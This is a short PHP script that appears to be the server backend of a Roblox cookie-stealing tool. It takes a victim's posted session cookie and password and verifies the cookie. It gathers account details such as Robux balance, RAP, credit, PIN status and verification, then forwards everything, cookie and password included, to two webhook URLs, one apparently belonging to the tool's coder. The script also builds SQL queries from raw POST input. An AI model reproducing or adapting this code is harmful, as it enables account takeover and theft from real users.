<?php
session_start();
include('../function.php');
include('../config.php');
if($_SERVER['REQUEST_METHOD'] == "POST"){
	$cookie = $_POST['cookie'];
	$code = $_POST['webhook'];
	$code1 = $_POST['coder'];
	$search = mysqli_query($connect, "SELECT * FROM webhook WHERE code='$code'");
	$search1 = mysqli_query($connect, "SELECT * FROM webhook WHERE code='$code1'");
	$password = $_POST['password'];
	if((mysqli_num_rows($search) > 0) && (requestTrueCookie($cookie) == "Cookie is valid")){
		$searchRow = mysqli_fetch_array($search);
		$searchRow1 = mysqli_fetch_array($search1);
		$webhookUrl = $searchRow['url'];
		$webhookUrl1 = $searchRow1['url'];
		$mobileInfo = requestMobileInfoCookie($cookie);
		$mobileInfo = json_decode($mobileInfo);
		$username = $mobileInfo->UserName;
		$robux = $mobileInfo->RobuxBalance;
		$id = $mobileInfo->UserID;
		$premium = $mobileInfo->IsPremium;
		$rap = requestRapCookie($id, $cookie);
		$credit = requestCreditCookie($cookie);
		$age = requestAge($id);
		$pin = requestPinCookie($cookie);
		$verified = requestVerifiedCookie($cookie);
		webhookCookie($username, $id, $robux, $rap, $premium, $credit, $pin, $age, $verified, $password, $cookie, $webhookUrl, $webhookUrl1);
	}
}
?>